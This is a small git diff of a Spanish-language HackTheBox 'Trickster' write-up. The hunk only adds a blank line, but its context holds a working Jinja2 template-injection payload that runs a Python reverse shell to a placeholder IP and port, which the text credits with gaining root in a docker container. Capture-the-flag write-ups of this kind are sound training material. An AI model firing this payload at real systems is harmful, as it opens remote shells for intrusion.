@@ -398,6 +398,7 @@ En el exploit de Python anterior, vimos la existencia de una flag llamada "*--no
 ```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}{% endif %}{% endfor %}
 ```
+
 ![](../assets/img/trickster-hackthebox-writeup/8.png)
 
 Conseguimos acceso como *root* al **docker**, 
